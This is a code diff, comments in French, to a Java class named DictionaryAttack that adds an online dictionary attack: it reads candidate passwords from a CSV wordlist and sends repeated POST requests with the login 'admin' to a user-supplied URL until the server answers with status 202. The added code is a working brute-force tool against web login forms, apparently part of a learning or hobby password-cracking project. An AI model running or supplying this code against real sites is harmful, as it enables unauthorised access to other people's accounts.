@@ -75,6 +75,70 @@ public class DictionaryAttack {
     System.out.println("Le mot de passe n'a pas été trouvé.");
   }
 
+  private static void dictionaryOnline(String urlduSite) throws IOException {
+    // Exploitation du fichier csv
+    String cheminFichier = "../assets/dictionnaires/dictionnaire.csv";
+    BufferedReader br = null;
+    String line = "";
+    String cvsSplitBy = ";";
+
+    // Initialisation du response code et de l'url du site
+    String url = urlduSite;
+    int responseCode = 0;
+
+    try {
+      br = new BufferedReader(new FileReader(cheminFichier));
+      while ((line = br.readLine()) != null && responseCode != 202) {
+        String[] mot = line.split(cvsSplitBy);
+        // Initialisation de la requête avec les paramètres fournis
+        String requestBody = "login=admin&password=" + mot[0];
+
+        // Envoi de la requete
+        try {
+          responseCode = envoieRequetePost(url, requestBody);
+          if (responseCode == 202) {
+            System.out.println("ResponseCode: " + responseCode);
+            System.out.println("Le mot de passe a été trouvé ! Il s'agissait de : " + mot[0]);
+            return;
+          }
+        } catch (IOException e) {
+          e.printStackTrace();
+          System.out.println("Erreur, Veuillez vérifier l'url saisie.");
+          return;
+        }
+      }
+    } catch (FileNotFoundException e) {
+      e.printStackTrace();
+    } finally {
+      if (br != null) {
+        try {
+          br.close();
+        } catch (IOException e) {
+          e.printStackTrace();
+        }
+      }
+    }
+    System.out.println("Le mot de passe n'a pas été trouvé.");
+
+  }
+
+  private static int envoieRequetePost(String url, String requestBody) throws IOException {
+    // Initialisation de la requete
+    URL endpoint = new URL(url);
+    HttpURLConnection connection = (HttpURLConnection) endpoint.openConnection();
+    connection.setRequestMethod("POST");
+    connection.setDoOutput(true);
+    connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+    connection.setRequestProperty("Content-Length", String.valueOf(requestBody.length()));
+    try (OutputStream outputStream = connection.getOutputStream()) {
+      outputStream.write(requestBody.getBytes(StandardCharsets.UTF_8));
+      outputStream.flush();
+    }
+    int responseCode = connection.getResponseCode();
+    connection.disconnect();
+    return responseCode;
+  }
+
   public static void dictionary(Password password) throws IOException {
     long startTime = System.currentTimeMillis();
     switch (password.getType()) {
@@ -89,6 +153,10 @@ public class DictionaryAttack {
         System.out.println("Erreur sur le type de mot de passe.");
         break;
     }
+  }
+
+  public static void dictionary(String urlduSite) throws IOException {
+    dictionaryOnline(urlduSite);
   }
 
 }
